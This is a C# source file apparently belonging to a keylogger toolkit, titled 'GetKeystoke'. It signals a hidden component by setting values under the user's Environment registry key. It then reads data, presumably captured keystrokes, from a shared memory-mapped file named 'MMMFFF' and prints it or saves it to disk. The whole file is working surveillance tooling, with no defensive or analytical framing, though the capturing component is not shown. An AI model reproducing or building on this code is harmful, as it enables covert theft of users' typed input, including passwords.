using System;
using Microsoft.Win32;
using System.IO.MemoryMappedFiles;
using System.Threading;
using System.IO;
using System.Text;

namespace GetKeystoke
{
    public class GetKeystoke
    {
        static MemoryMappedFile GetMMF(string name)
        {
            int c = 0;
            MemoryMappedFile mmf;
            while (c < 125)
            {
                try
                {
                    mmf = MemoryMappedFile.OpenExisting(name);
                    return mmf;
                }
                catch
                {
                    Thread.Sleep(40);
                }
                c += 1;
            }
            return null;
        }

        static byte[] ExtractData(MemoryMappedViewAccessor view)
        {
            byte[] byteData = new byte[view.Capacity];
            view.ReadArray(0, byteData, 0, (int)view.Capacity);
            view.Dispose();
            return byteData;
        }

        static bool WriteRes(string path, byte[] data)
        {
            string dir = Path.GetDirectoryName(path);
            if (!Directory.Exists(dir))
            {
                return false;
            }
            else
            {
                try
                {
                    File.WriteAllBytes(path, data);
                }
                catch
                {
                    return false;
                }
            }
            return true;
        }



        static void Main(string[] args)
        {
            RegistryKey key = RegistryKey.OpenBaseKey(RegistryHive.CurrentUser, RegistryView.Default);
            RegistryKey subkey = key.OpenSubKey("Environment", true);
            subkey.SetValue("UserEnvironment", 12, RegistryValueKind.DWord);
            MemoryMappedFile mmf = GetMMF("MMMFFF");
            if (mmf == null)
            {
                Console.WriteLine("Timed out waiting for MemoryMappedFile to become available");
                Environment.Exit(-1);
            }
            MemoryMappedViewAccessor view = mmf.CreateViewAccessor();
            byte[] byteData = ExtractData(view);
            view.Dispose();
            mmf.Dispose();
            subkey.SetValue("UserEnvironment", 123, RegistryValueKind.DWord);
            subkey.Close();
            key.Close();
            if (args.Length > 1)
            {
                string path = args[args.Length - 1];
                if (!WriteRes(path, byteData))
                {
                    Console.WriteLine("No such a directory " + path);
                    Environment.Exit(-1);
                }
            }
            else
            {
                Console.WriteLine(Encoding.UTF8.GetString(byteData));
            }
        }
    }
}
